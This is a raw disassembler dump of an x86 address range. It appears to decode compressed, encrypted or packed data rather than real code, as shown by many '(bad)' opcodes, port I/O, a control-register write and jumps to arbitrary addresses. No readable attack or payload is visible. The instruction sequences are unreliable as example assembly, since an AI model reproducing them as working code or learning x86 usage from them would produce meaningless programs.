  419376:	jne    0x41933b
  419378:	dec    eax
  419379:	out    0x6f,eax
  41937b:	mov    eax,ds:0x2e595dfb
  419380:	mov    ds:0xfa9a2242,al
  419385:	out    dx,eax
  419386:	jo     0x4193e9
  419388:	popf   
  419389:	mov    BYTE PTR [edx+ecx*1-0x8],ch
  41938d:	dec    edi
  41938e:	xor    al,0x80
  419390:	adc    al,0xbb
  419392:	mov    al,ds:0x3fb86694
  419397:	cmc    
  419398:	ja     0x419363
  41939a:	mov    ebp,0xb639a34c
  41939f:	pop    ecx
  4193a0:	addr16 sub al,dl
  4193a3:	sub    eax,0x157e68e5
  4193a8:	inc    esp
  4193a9:	mov    BYTE PTR [ecx-0x36373ea1],dh
  4193af:	stc    
  4193b0:	pop    edi
  4193b1:	jns    0x4193e4
  4193b3:	test   ch,al
  4193b5:	and    DWORD PTR [eax+0x323f94b],eax
  4193bb:	sbb    al,0xe0
  4193bd:	ror    DWORD PTR [edi+eiz*8+0x7c],1
  4193c1:	sub    BYTE PTR [ecx-0x29],dh
  4193c4:	add    DWORD PTR [ebx-0x2d],edi
  4193c7:	mov    cl,0xeb
  4193c9:	clc    
  4193ca:	lods   al,BYTE PTR ds:[esi]
  4193cb:	dec    edx
  4193cc:	xor    eax,esp
  4193ce:	clc    
  4193cf:	jp     0x4193bb
  4193d1:	xchg   esp,eax
  4193d2:	xchg   ebx,eax
  4193d3:	ret    0xbfa8
  4193d6:	mov    ch,0x73
  4193d8:	xchg   esi,eax
  4193d9:	and    ecx,DWORD PTR [edx]
  4193db:	stc    
  4193dc:	jbe    0x419386
  4193de:	test   BYTE PTR [eax+ebx*4],cl
  4193e1:	(bad)  
  4193e2:	push   ebx
  4193e3:	mov    al,0xba
  4193e5:	inc    edi
  4193e6:	(bad)  
  4193e7:	loopne 0x41937c
  4193e9:	shl    DWORD PTR es:[eax+0x20f44ae6],cl
  4193f0:	cmp    al,0x9c
  4193f2:	push   es
  4193f3:	dec    eax
  4193f4:	rcr    BYTE PTR [edx+0x6f],0x15
  4193f8:	(bad)  
  4193f9:	mov    eax,0x4d9f697b
  4193fe:	jnp    0x419475
  419400:	out    dx,al
  419401:	fwait
  419402:	je     0x419445
  419404:	outs   dx,BYTE PTR ds:[esi]
  419405:	lds    ecx,FWORD PTR [esi-0x49]
  419408:	pushf  
  419409:	adc    DWORD PTR [edx+edi*1],0x3a
  41940d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41940e:	gs push esi
  419410:	and    DWORD PTR [eax],ecx
  419412:	loope  0x419416
  419414:	mov    dh,0x8e
  419416:	inc    edx
  419417:	xchg   DWORD PTR [esi-0x138b5c00],esi
  41941d:	or     ch,BYTE PTR [ebp+0xc82b96f]
  419423:	or     ecx,DWORD PTR [edi+0xa]
  419426:	out    0x9f,al
  419428:	mov    edx,0x64537502
  41942d:	dec    eax
  41942e:	neg    DWORD PTR [edi-0x36]
  419431:	jo     0x41949b
  419433:	inc    ecx
  419434:	adc    DWORD PTR [edi-0x733dfc48],ebp
  41943a:	inc    esp
  41943b:	call   0x9e90bfe1
  419440:	sub    al,0x31
  419442:	mov    al,0xe7
  419444:	jnp    0x4194c1
  419446:	jmp    0xbed707c2
  41944b:	mov    dh,0x94
  41944d:	repz dec esi
  41944f:	and    eax,0xf655dbe4
  419454:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419455:	sub    al,0x4b
  419457:	dec    edx
  419458:	mov    dl,0x24
  41945a:	fs aad 0xa5
  41945d:	ja     0x41945a
  41945f:	lods   al,BYTE PTR ds:[esi]
  419460:	mov    dl,0x11
  419462:	div    BYTE PTR [ecx+0x154806c3]
  419468:	xor    al,0x5
  41946a:	stos   DWORD PTR es:[edi],eax
  41946b:	sti    
  41946c:	ins    DWORD PTR es:[edi],dx
	...
  4194d5:	add    BYTE PTR ds:0xed3a6998,bh
  4194db:	sti    
  4194dc:	jg     0x41947d
  4194de:	cmp    ebx,esi
  4194e0:	je     0x4194a8
  4194e2:	xlat   BYTE PTR ds:[ebx]
  4194e3:	iret   
  4194e4:	mov    WORD PTR [ebx],?
  4194e6:	adc    BYTE PTR cs:[ecx],al
  4194e9:	add    bh,bh
  4194eb:	add    BYTE PTR [eax],al
  4194ed:	add    BYTE PTR [ecx],bl
  4194ef:	dec    ecx
  4194f0:	dec    eax
  4194f1:	mov    BYTE PTR ds:0xe2abc301,cl
  4194f7:	int3   
  4194f8:	out    dx,al
  4194f9:	mov    ds:0x6bd3b2c,al
  4194fe:	test   al,0x7b
  419500:	push   0xf5dd0d40
  419505:	mov    ss,WORD PTR [edi+0x442187a3]
  41950b:	sar    BYTE PTR [esi*1+0xb5da6fa],0xca
  419513:	gs add dl,dl
  419516:	add    al,0xa9
  419518:	and    edi,DWORD PTR [eax+0x75]
  41951b:	pop    esp
  41951c:	jno    0x4194a4
  41951e:	addr16 bnd jp 0x4194a9
  419522:	push   edx
  419523:	in     al,dx
  419524:	loop   0x419589
  419526:	mov    ds:0x96606219,eax
  41952b:	xchg   edx,eax
  41952c:	and    BYTE PTR [esi+0x70],0x3b
  419530:	jno    0x4194ec
  419532:	sbb    bh,0x93
  419535:	ror    DWORD PTR [esi-0x420e1bb2],0x99
  41953c:	pop    DWORD PTR [edx]
  41953e:	mov    al,0xdd
  419540:	xchg   eax,edi
  419542:	jmp    0xd40:0xfbaa4e3d
  419549:	fnsave ds:0x9a559e1
  41954f:	scas   eax,DWORD PTR es:[edi]
  419550:	xchg   ebp,eax
  419551:	jo     0x419520
  419553:	and    al,0x56
  419555:	icebp  
  419556:	add    edi,DWORD PTR [eax-0x5f6d21a]
  41955c:	sub    eax,0x854161fe
  419561:	push   cs
  419562:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419563:	pop    ds
  419564:	xor    ebx,DWORD PTR [ecx]
  419566:	stos   BYTE PTR es:[edi],al
  419567:	inc    esp
  419568:	dec    ebp
  419569:	xchg   edx,eax
  41956a:	mov    esi,0x125acbf0
  41956f:	pushf  
  419570:	pop    ebp
  419571:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419572:	out    0x94,eax
  419574:	push   0xa2f13d27
  419579:	call   0xc9dc:0x8a376197
  419580:	mov    esi,0x8da9e96e
  419585:	jns    0x419579
  419587:	ror    BYTE PTR ds:0xa1aabc33,0xc5
  41958e:	fdivr  st,st(7)
  419590:	push   cs
  419591:	sub    esp,edx
  419593:	jg     0x4195a0
  419595:	inc    esi
  419596:	loop   0x419565
  419598:	out    0x5e,eax
  41959a:	in     eax,dx
  41959b:	pushf  
  41959c:	push   ebp
  41959d:	inc    edi
  41959e:	dec    esp
  41959f:	enter  0x16ac,0x7b
  4195a3:	fist   DWORD PTR [esi+0x7f]
  4195a6:	in     al,dx
  4195a7:	inc    eax
  4195a8:	and    eax,0x85dffc2a
  4195ad:	or     al,0x1b
  4195af:	or     eax,0x15b55be1
  4195b4:	sbb    edi,ebx
  4195b6:	adc    cl,BYTE PTR [ebp+0x20def35b]
  4195bc:	popa   
  4195bd:	adc    al,0xe
  4195bf:	in     al,0x9d
  4195c1:	in     al,dx
  4195c2:	in     eax,dx
  4195c3:	push   0x51839575
  4195c8:	popf   
  4195c9:	std    
  4195ca:	cld    
  4195cb:	sti    
  4195cc:	sar    DWORD PTR [edi],cl
  4195ce:	call   FWORD PTR [ebx]
  4195d0:	push   edi
  4195d1:	xchg   ebx,edx
  4195d3:	dec    edx
  4195d4:	dec    esp
  4195d5:	xlat   BYTE PTR ds:[ebx]
  4195d6:	push   eax
  4195d7:	cmp    eax,0x3f9d0b32
  4195dc:	xchg   DWORD PTR ds:0xbb8e713a,esi
  4195e2:	and    dl,BYTE PTR [edi-0x80]
  4195e5:	rol    DWORD PTR [ebp-0x41505d8d],1
  4195eb:	xchg   BYTE PTR [ecx+0x0],ch
	...
  419655:	add    BYTE PTR [edi-0x9d722c],ch
  41965b:	jnp    0x41964c
  41965d:	fstp   st(1)
  41965f:	fcomp  QWORD PTR [ebx+0x2f]
  419662:	test   DWORD PTR [ecx+esi*4],ebp
  419665:	or     al,0x2d
  419667:	adc    DWORD PTR [ecx],eax
  419669:	add    bh,bh
  41966b:	add    BYTE PTR [eax],al
  41966d:	add    BYTE PTR [edi-0x755cab12],ah
  419673:	push   es
  419674:	push   eax
  419675:	adc    bh,BYTE PTR [ebp+eiz*1-0x70]
  419679:	and    BYTE PTR [edx-0xa],bh
  41967c:	push   cs
  41967d:	test   al,0x22
  41967f:	xchg   edi,eax
  419680:	shl    bh,cl
  419682:	fst    DWORD PTR es:[eax-0x56ffd129]
  419689:	xor    BYTE PTR [esp+esi*1],dl
  41968c:	xor    BYTE PTR [edx+0x336f2700],al
  419692:	into   
  419693:	mov    eax,0x9831d376
  419698:	jg     0x419667
  41969a:	cmp    bl,bl
  41969c:	jns    0x4196f7
  41969e:	xchg   edi,eax
  41969f:	xchg   edi,eax
  4196a0:	pop    ecx
  4196a1:	(bad)  
  4196a2:	jmp    0x419650
  4196a4:	lahf   
  4196a5:	scas   al,BYTE PTR es:[edi]
  4196a6:	jle    0x4196e8
  4196a8:	mov    bl,0xbf
  4196aa:	dec    BYTE PTR [edx]
  4196ac:	dec    edx
  4196ad:	das    
  4196ae:	in     al,0xa5
  4196b0:	test   eax,0xf87d4884
  4196b5:	mov    eax,0x637fa70e
  4196ba:	shl    BYTE PTR [esi-0x71],0x1e
  4196be:	jbe    0x419666
  4196c0:	retf   
  4196c1:	xchg   edx,eax
  4196c2:	bound  ebp,QWORD PTR [ebx+0x6144148f]
  4196c8:	mov    ch,0x21
  4196ca:	push   cs
  4196cb:	lds    ebp,FWORD PTR [edx+eiz*8]
  4196ce:	fild   QWORD PTR [ebp-0x16]
  4196d1:	in     eax,dx
  4196d2:	mov    edx,0x33db03b4
  4196d7:	inc    ecx
  4196d8:	pop    ecx
  4196d9:	outs   dx,DWORD PTR ds:[esi]
  4196da:	inc    esp
  4196db:	frstor [ebx-0x1d]
  4196de:	aaa    
  4196df:	cmp    ecx,DWORD PTR [edx+0x6]
  4196e2:	int    0x2b
  4196e4:	and    DWORD PTR [esi-0x5d],ebx
  4196e7:	cdq    
  4196e8:	cmc    
  4196e9:	jo     0x419739
  4196eb:	sbb    eax,0x9bd5bc66
  4196f0:	jns    0x419701
  4196f2:	icebp  
  4196f3:	push   ebx
  4196f4:	cmp    al,0xab
  4196f6:	aad    0xcf
  4196f8:	mov    al,0xdc
  4196fa:	jmp    0x2b92:0x98f0dcd1
  419701:	pop    es
  419702:	mov    WORD PTR [esi-0x66],gs
  419705:	arpl   WORD PTR [esi],bp
  419707:	mov    ds:0x5bb6cf63,al
  41970c:	xlat   BYTE PTR ds:[ebx]
  41970d:	lea    ecx,fs:[ebx+0x17]
  419711:	out    0xd2,al
  419713:	sub    eax,0xa4639f9f
  419718:	sbb    cl,BYTE PTR [edx]
  41971a:	sub    DWORD PTR [ecx-0x40],ebx
  41971d:	push   es
  41971e:	scas   al,BYTE PTR es:[edi]
  41971f:	out    dx,al
  419720:	call   FWORD PTR [ebp+0x28502837]
  419726:	mov    cl,0x30
  419728:	mov    al,ds:0x957ddab4
  41972d:	pushf  
  41972e:	pop    eax
  41972f:	rcl    BYTE PTR [edi],1
  419731:	or     BYTE PTR [ebp+0x49],0xca
  419735:	outs   dx,DWORD PTR ds:[esi]
  419736:	daa    
  419737:	inc    ebx
  419738:	jl     0x419768
  41973a:	lock pop ecx
  41973c:	inc    ebx
  41973d:	shl    DWORD PTR [esi-0x29],0xaa
  419741:	or     eax,0x1bb27447
  419746:	or     ecx,DWORD PTR [edi+0x178b3cba]
  41974c:	mov    ch,0x29
  41974e:	cs int3 
  419750:	test   eax,0xdefd1a6c
  419755:	pop    ecx
  419756:	test   eax,0x4534b6ab
  41975b:	das    
  41975c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41975d:	fmulp  st(4),st
  41975f:	and    BYTE PTR [ecx],dh
  419761:	les    ebp,FWORD PTR [edi+esi*2]
  419764:	mov    edi,0x1a194347
  419769:	iret   
  41976a:	cmp    al,0x4c
  41976c:	test   eax,0x0
	...
  4197d5:	add    BYTE PTR [ebx-0x29a8ec1],dh
  4197db:	outs   dx,DWORD PTR ds:[esi]
  4197dc:	mov    bh,0xff
  4197de:	add    eax,0xbd8dd0ae
  4197e3:	(bad)  
  4197e4:	jge    0x419825
  4197e6:	sub    al,0x12
  4197e8:	add    DWORD PTR [eax],eax
  4197ea:	inc    DWORD PTR [eax]
  4197ec:	add    BYTE PTR [eax],al
  4197ee:	test   eax,0xd1dde230
  4197f3:	sub    BYTE PTR [ecx+0x68],ch
  4197f6:	sub    bl,ch
  4197f8:	(bad)  
  4197f9:	aaa    
  4197fa:	pop    es
  4197fb:	jne    0x41983b
  4197fd:	push   esi
  4197fe:	fidivr DWORD PTR [edx-0x5200e61d]
  419804:	lods   eax,DWORD PTR ds:[esi]
  419805:	push   ds
  419806:	mov    eax,0x50592b12
  41980b:	xchg   BYTE PTR es:[esi+0x1],al
  41980f:	cmp    esi,eax
  419811:	fld    DWORD PTR [ebp+0x43]
  419814:	lds    eax,FWORD PTR [ecx]
  419816:	cmp    BYTE PTR [edx-0x1637598],ch
  41981c:	mov    bh,0xb4
  41981e:	retf   0x8bb3
  419821:	scas   eax,DWORD PTR es:[edi]
  419822:	outs   dx,DWORD PTR ds:[esi]
  419823:	sub    eax,0xb865b271
  419828:	adc    eax,0x58ff1e41
  41982d:	dec    edx
  41982e:	jg     0x419837
  419830:	test   BYTE PTR [eax-0x3a54a9b1],cl
  419836:	lock outs dx,BYTE PTR ds:[esi]
  419839:	(bad)  [esi-0x6e7876a9]
  41983f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419840:	dec    ebp
  419841:	inc    DWORD PTR ds:0x7ae85fe1
  419847:	mov    cl,0xbc
  419849:	out    dx,eax
  41984a:	fld    QWORD PTR [ebp+0x3d198431]
  419850:	cmp    ch,BYTE PTR [ebx-0x4964df74]
  419856:	jecxz  0x419878
  419858:	add    al,0x8c
  41985a:	ss push esp
  41985c:	lahf   
  41985d:	mov    esi,0xa71a033d
  419862:	enter  0x1c22,0xbb
  419866:	fstp   TBYTE PTR [edx-0x51d8d54]
  41986c:	aad    0xfc
  41986e:	fidivr WORD PTR [edi-0x4956a9f4]
  419874:	and    esi,DWORD PTR [eax+0x419fff33]
  41987a:	lods   eax,DWORD PTR ds:[esi]
  41987b:	aad    0x9c
  41987d:	fsubrp st(4),st
  41987f:	inc    ebx
  419880:	push   edi
  419881:	out    0xe6,al
  419883:	jle    0x4198dd
  419885:	push   ebx
  419886:	inc    BYTE PTR [eax]
  419888:	mov    edx,0xa358d4df
  41988d:	pop    edi
  41988e:	cmp    eax,0xce8a99b
  419893:	sar    eax,0x52
  419896:	adc    DWORD PTR [ebp+0x37b9495f],ebp
  41989c:	mov    al,0xcd
  41989e:	mov    dh,0xac
  4198a0:	cli    
  4198a1:	fldcw  WORD PTR [eax+0x4034175c]
  4198a7:	mov    eax,0xc2bde823
  4198ac:	in     eax,0x81
  4198ae:	fnstenv [bp+si-0x14ed]
  4198b3:	rep outs dx,DWORD PTR ds:[esi]
  4198b5:	or     dh,ch
  4198b7:	dec    eax
  4198b8:	ds test eax,0xf75a8bd
  4198be:	ret    
  4198bf:	dec    ecx
  4198c0:	scas   eax,DWORD PTR es:[edi]
  4198c1:	or     esi,DWORD PTR [ecx-0x6310d433]
  4198c7:	jmp    0x419921
  4198c9:	dec    edi
  4198ca:	jg     0x41990b
  4198cc:	loope  0x419876
  4198ce:	stos   DWORD PTR es:[edi],eax
  4198cf:	(bad)  
  4198d0:	stc    
  4198d1:	push   ebx
  4198d2:	mov    BYTE PTR [edi+0x4d],bl
  4198d5:	inc    ebx
  4198d6:	jecxz  0x4198fe
  4198d8:	xchg   ebx,eax
  4198d9:	xchg   edi,eax
  4198da:	ret    
  4198db:	add    eax,0xebeecad9
  4198e0:	jl     0x41993d
  4198e2:	mov    esi,0xbe18c32
  4198e7:	add    BYTE PTR [ebp-0x3c895343],ch
	...
  419955:	add    BYTE PTR [edx-0x201eb8e7],al
  41995b:	jmp    DWORD PTR [esi+0x45e3657b]
  419961:	frstor [edx+0x38]
  419964:	or     eax,DWORD PTR ds:0x1132b
  41996a:	inc    DWORD PTR [eax]
  41996c:	add    BYTE PTR [eax],al
  41996e:	mov    eax,ds:0xd73bbb7c
  419973:	jbe    0x4199d7
  419975:	push   edx
  419976:	cld    
  419977:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419978:	adc    edi,eax
  41997a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41997b:	xlat   BYTE PTR ds:[ebx]
  41997c:	add    bh,BYTE PTR [edx]
  41997e:	addr16 xchg edx,eax
  419980:	mov    esi,0x89899be3
  419985:	add    BYTE PTR [edx],0x6e
  419988:	pop    edi
  419989:	dec    esi
  41998a:	inc    edx
  41998b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41998c:	mov    ch,0x65
  41998e:	in     al,0xb2
  419990:	std    
  419991:	pop    ecx
  419992:	loopne 0x4199ea
  419994:	sti    
  419995:	adc    eax,0x510bed26
  41999a:	and    ebp,ecx
  41999c:	ss cmc 
  41999e:	mov    eax,0x9d73501f
  4199a3:	idiv   BYTE PTR [eax]
  4199a5:	sub    ebx,DWORD PTR [esp+ebp*1+0x7c]
  4199a9:	lods   eax,DWORD PTR ds:[esi]
  4199aa:	(bad)  
  4199ab:	pop    esi
  4199ac:	xor    bh,BYTE PTR [esi]
  4199ae:	in     al,0x4f
  4199b0:	pop    ebx
  4199b1:	pop    ss
  4199b2:	adc    ebx,DWORD PTR [ecx+0x680137c5]
  4199b8:	out    dx,al
  4199b9:	and    BYTE PTR [edx-0x5716443b],bl
  4199bf:	push   es
  4199c0:	repz inc esp
  4199c2:	stc    
  4199c3:	sbb    al,0x2d
  4199c5:	inc    esi
  4199c6:	push   0x98780ed
  4199cb:	imul   ebx,DWORD PTR [edx+eax*8-0x259739fe],0x5f7322c6
  4199d6:	mov    WORD PTR [ecx-0x4de0c8d],ss
  4199dc:	lds    edi,FWORD PTR [ebx+0x3885a307]
  4199e2:	aaa    
  4199e3:	ret    0xbecb
  4199e6:	aas    
  4199e7:	sub    ebp,edx
  4199e9:	add    eax,0xca0754ac
  4199ee:	shl    edi,0x6d
  4199f1:	dec    edx
  4199f2:	push   0x74
  4199f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4199f5:	imul   esp,DWORD PTR [edx-0x60234e8c],0x18
  4199fc:	data16 mov ds:0xfd5b5659,al
  419a02:	xchg   esp,eax
  419a03:	scas   al,BYTE PTR es:[edi]
  419a04:	retf   
  419a05:	into   
  419a06:	call   0xfd036c0b
  419a0b:	out    0x35,eax
  419a0d:	mov    edx,0x6081cc56
  419a12:	jne    0x4199be
  419a14:	and    al,0xf3
  419a16:	cwde   
  419a17:	xchg   BYTE PTR [eax+0x2a],dl
  419a1a:	sub    al,0x72
  419a1c:	pop    ebp
  419a1d:	adc    al,0x2c
  419a1f:	jne    0x4199dc
  419a21:	pop    ds
  419a22:	push   cs
  419a23:	(bad)  
  419a24:	inc    ecx
  419a25:	jecxz  0x4199be
  419a27:	mov    esi,0xa76170ce
  419a2c:	test   eax,0x4e3c0e54
  419a31:	fiadd  DWORD PTR [edi+0xd70947a]
  419a37:	not    BYTE PTR [ebp+0x57]
  419a3a:	and    eax,DWORD PTR [eax+0x50afdda7]
  419a40:	in     eax,dx
  419a41:	ja     0x419abd
  419a43:	in     eax,0x9d
  419a45:	jae    0x4199f9
  419a47:	inc    ebx
  419a48:	and    al,0x93
  419a4a:	(bad)  
  419a4b:	(bad)  
  419a4d:	fcomp  QWORD PTR [esi+ebx*4-0x6ccf0e9]
  419a54:	mov    ds:0x8abdca5e,al
  419a59:	add    al,BYTE PTR [eax+0x26037d24]
  419a5f:	scas   eax,DWORD PTR es:[edi]
  419a60:	push   ds
  419a61:	pop    esi
  419a62:	cdq    
  419a63:	icebp  
  419a64:	pop    ebx
  419a65:	leave  
  419a66:	mov    ebp,DWORD PTR [ebp+ebp*2+0x1f895224]
	...
  419ad5:	add    BYTE PTR [ebx],dh
  419ad7:	xor    DWORD PTR [ebx+0x77e793c5],edx
  419add:	test   ebx,0x3c215d3
  419ae3:	hlt    
  419ae4:	in     eax,dx
  419ae5:	or     al,0x2a
  419ae7:	adc    al,0x1
  419ae9:	add    bh,bh
  419aeb:	add    BYTE PTR [eax],al
  419aed:	add    BYTE PTR [eax+0x776c64e],dh
  419af3:	xor    ch,BYTE PTR [esi]
  419af5:	adc    ebx,0xfffffff4
  419af8:	scas   eax,DWORD PTR es:[edi]
  419af9:	xchg   ebp,eax
  419afa:	call   0xcaa98344
  419aff:	(bad)  [ebx]
  419b01:	push   es
  419b02:	ins    BYTE PTR es:[edi],dx
  419b03:	call   0x561e:0x69b08e12
  419b0a:	sbb    ah,BYTE PTR [edx+edx*2-0x7a]
  419b0e:	inc    edx
  419b0f:	jmp    0x419b87
  419b11:	lahf   
  419b12:	jl     0x419b6d
  419b14:	mov    ebp,0xd540f573
  419b19:	outs   dx,DWORD PTR ds:[esi]
  419b1a:	xchg   al,bh
  419b1c:	nop
  419b1d:	sbb    eax,0xe0960c40
  419b22:	push   0x63
  419b24:	xchg   al,cl
  419b26:	inc    ecx
  419b27:	cld    
  419b28:	cmp    ch,BYTE PTR [ecx+0x18]
  419b2b:	test   eax,0x85d64080
  419b30:	add    DWORD PTR ds:[ecx+eax*4],esi
  419b34:	call   0xcfaa:0x725caa1f
  419b3b:	cs in  al,dx
  419b3d:	adc    DWORD PTR [edi-0x14],0xcdb9c020
  419b44:	mov    ah,0x48
  419b46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b47:	neg    eax
  419b49:	enter  0xa6fa,0x13
  419b4d:	in     eax,0x35
  419b4f:	jo     0x419b62
  419b51:	(bad)  
  419b52:	sahf   
  419b53:	call   0x445b6766
  419b58:	stc    
  419b59:	clc    
  419b5a:	mov    bl,ch
  419b5c:	push   es
  419b5d:	out    dx,eax
  419b5e:	dec    edi
  419b5f:	dec    esi
  419b60:	(bad)  
  419b61:	sub    ebp,DWORD PTR [ebx]
  419b63:	data16 hlt 
  419b65:	jl     0x419bd2
  419b67:	fisttp WORD PTR [ebx-0xc4cd504]
  419b6d:	push   ebx
  419b6e:	imul   esp,DWORD PTR [ebx-0x54],0x8464e2f6
  419b75:	imul   ebx,DWORD PTR [edx],0xb0c35fe2
  419b7b:	sub    edi,DWORD PTR [ecx]
  419b7d:	test   DWORD PTR [ecx-0x1a],esi
  419b80:	push   ss
  419b81:	pop    ss
  419b82:	push   ds
  419b83:	jp     0x419b37
  419b85:	sub    eax,0x25509737
  419b8a:	push   ds
  419b8b:	mov    esp,DWORD PTR [eax]
  419b8d:	in     eax,0xf2
  419b8f:	inc    ebx
  419b90:	dec    esi
  419b91:	inc    ebp
  419b92:	pop    ds
  419b93:	(bad)  
  419b94:	jg     0x419bcf
  419b96:	or     ebp,eax
  419b98:	adc    DWORD PTR [ebp-0x51],0xffffffd6
  419b9c:	dec    ebp
  419b9d:	ins    BYTE PTR es:[edi],dx
  419b9e:	repnz ss mov ch,0x2b
  419ba2:	call   0x6250cd09
  419ba7:	cmp    eax,0x96a32c8d
  419bac:	add    DWORD PTR [edi+ebp*1+0x49],edi
  419bb0:	out    dx,al
  419bb1:	lahf   
  419bb2:	retf   
  419bb3:	fiadd  WORD PTR [ecx-0x79]
  419bb6:	pop    ds
  419bb7:	inc    edx
  419bb8:	inc    eax
  419bb9:	mov    ss,WORD PTR [ebx-0x5e35fcba]
  419bbf:	and    DWORD PTR [ecx+edx*4+0x98a66c9],0xffffffac
  419bc7:	xchg   ebx,eax
  419bc8:	add    eax,0x6bfb2ed7
  419bcd:	mov    edi,0xae998fb6
  419bd2:	push   cs
  419bd3:	data16 arpl WORD PTR [ebp-0x4e],ax
  419bd7:	pop    edi
  419bd8:	retf   
  419bd9:	mov    cr0,ecx
  419bdc:	sar    ch,1
  419bde:	sahf   
  419bdf:	cli    
  419be0:	mul    BYTE PTR [ecx+0x7e651a24]
  419be6:	add    ch,BYTE PTR [edi-0x5b]
  419be9:	pop    di
  419beb:	ret    
  419bec:	inc    ecx
	...
  419c55:	add    BYTE PTR [edx-0x3c],cl
  419c58:	cli    
  419c59:	inc    edi
  419c5a:	(bad)  
  419c5b:	jg     0x419c5c
  419c5d:	int    0x88
  419c5f:	xchg   ecx,eax
  419c60:	lods   al,BYTE PTR ds:[esi]
  419c61:	or     al,0xe5
  419c63:	dec    ebx
  419c64:	or     DWORD PTR [ebx+0x11529],edi
  419c6a:	inc    DWORD PTR [eax]
  419c6c:	add    BYTE PTR [eax],al
  419c6e:	in     eax,0x6
  419c70:	leave  
  419c71:	xchg   DWORD PTR [eax-0x6703d34e],edi
  419c77:	dec    ecx
  419c78:	arpl   WORD PTR ds:0x9f58c0f2,cx
  419c7e:	mov    BYTE PTR [ecx],dh
  419c80:	xor    al,BYTE PTR [edx]
  419c82:	fisttp DWORD PTR [edi]
  419c84:	out    0xdf,al
  419c86:	mov    bl,0xc3
  419c88:	(bad)  
  419c8a:	shl    dl,0xd7
  419c8d:	popa   
  419c8e:	jmp    0x4937a6ea
  419c93:	sti    
  419c94:	mov    ds:0x606e2158,al
  419c99:	pop    ss
  419c9a:	and    eax,0xaf2a9420
  419c9f:	mov    BYTE PTR [edx+edx*2],dl
  419ca2:	dec    ebx
  419ca3:	xor    cl,BYTE PTR [edx+eax*8]
  419ca6:	out    dx,eax
  419ca7:	push   0x802c2273
  419cac:	inc    ecx
  419cad:	(bad)
  419cb0:	xor    bh,ch
  419cb2:	nop
  419cb3:	jg     0x419c72
  419cb5:	xor    al,0x31
  419cb7:	in     eax,0xc7
  419cb9:	jl     0x419d0a
  419cbb:	retf   
  419cbc:	fsubr  st(1),st
  419cbe:	cld    
  419cbf:	outs   dx,DWORD PTR ds:[esi]
  419cc0:	inc    edi
  419cc1:	xchg   ebx,eax
  419cc2:	dec    BYTE PTR [ebx+0x78226e68]
  419cc8:	mov    ds:0x6a3b01dc,eax
  419ccd:	das    
  419cce:	(bad)  
  419ccf:	call   0xf944:0xf091f898
  419cd6:	jae    0x419d1f
  419cd8:	arpl   cx,si
  419cda:	retf   
  419cdb:	icebp  
  419cdc:	dec    esi
  419cdd:	sti    
  419cde:	sub    eax,0x431e0611
  419ce3:	push   esi
  419ce4:	rcr    DWORD PTR [eax-0x60aa18fd],0xd0
  419ceb:	mov    ebp,0x969c7875
  419cf0:	xlat   BYTE PTR ds:[ebx]
  419cf1:	sub    BYTE PTR [ebx+0x8c2bcbc],ah
  419cf7:	bswap  ebp
  419cf9:	mov    ch,0x1f
  419cfb:	fst    QWORD PTR [ecx]
  419cfd:	push   esp
  419cfe:	imul   edi,DWORD PTR [ebp-0x4c9f3155],0xffffffb6
  419d05:	inc    esi
  419d06:	mov    esp,DWORD PTR [ebp-0xd]
  419d09:	cmp    al,0x4
  419d0b:	mov    esi,0x6faf4282
  419d10:	mov    al,ds:0x1a68cabd
  419d15:	inc    esi
  419d16:	ins    DWORD PTR es:[edi],dx
  419d17:	push   esi
  419d18:	inc    eax
  419d19:	mov    dh,dh
  419d1b:	push   DWORD PTR [ecx-0x2edbd087]
  419d21:	ja     0x419d05
  419d23:	outs   dx,BYTE PTR ds:[esi]
  419d24:	call   0xde6e:0x388ea952
  419d2b:	jo     0x419d6f
  419d2d:	push   es
  419d2e:	jp     0x419cb3
  419d30:	and    al,0xaf
  419d32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419d33:	pop    es
  419d34:	mov    ebx,0x617f2b1e
  419d39:	pop    esp
  419d3a:	mov    cl,0x24
  419d3c:	adc    eax,0xf0659539
  419d41:	mov    cl,al
  419d43:	mov    ch,0xb9
  419d46:	(bad)  
  419d47:	shl    DWORD PTR ds:0x7c9619b,1
  419d4d:	aaa    
  419d4e:	aad    0x6f
  419d50:	inc    ebx
  419d51:	out    dx,eax
  419d52:	and    al,0xa
  419d54:	imul   ebp,DWORD PTR [esi+0x185db77c],0x99e02534
  419d5e:	add    bh,bh
  419d60:	ins    DWORD PTR es:[edi],dx
  419d61:	dec    ecx
  419d62:	(bad)  
  419d64:	int3   
  419d65:	ror    DWORD PTR [esi+0xb],cl
  419d68:	jb     0x419d05
  419d6a:	in     eax,dx
  419d6b:	xchg   esi,eax
  419d6c:	rol    DWORD PTR [eax],cl
	...
  419dd6:	lock xchg edi,eax
  419dd8:	std    
  419dd9:	cmp    al,0xff
  419ddb:	jle    0x419dce
  419ddd:	fistp  QWORD PTR [edi-0x16]
  419de0:	ficomp DWORD PTR ss:[ebx+0x2851edfd]
  419de7:	push   ss
  419de8:	add    DWORD PTR [eax],eax
  419dea:	inc    DWORD PTR [eax]
  419dec:	add    BYTE PTR [eax],al
  419dee:	xor    ah,BYTE PTR [ecx]
  419df0:	ds lahf 
  419df2:	inc    esp
  419df3:	mov    BYTE PTR [ebp+0x2dee08da],al
  419df9:	jp     0x419dd4
  419dfb:	daa    
  419dfc:	je     0x419dce
  419dfe:	adc    al,0xc9
  419e00:	mov    WORD PTR [ecx-0x27],?
  419e03:	xchg   ebx,eax
  419e04:	and    eax,0xc5cf2c8f
  419e09:	sbb    dh,BYTE PTR [edx+0x39]
  419e0c:	inc    edx
  419e0d:	lds    edx,FWORD PTR [ecx+0x4de0ddac]
  419e13:	mov    edi,0x4129e0fb
  419e18:	pop    esi
  419e19:	jecxz  0x419e92
  419e1b:	mov    esp,0xef6fff94
  419e20:	cmp    bh,dh
  419e22:	push   0xffffffed
  419e24:	fwait
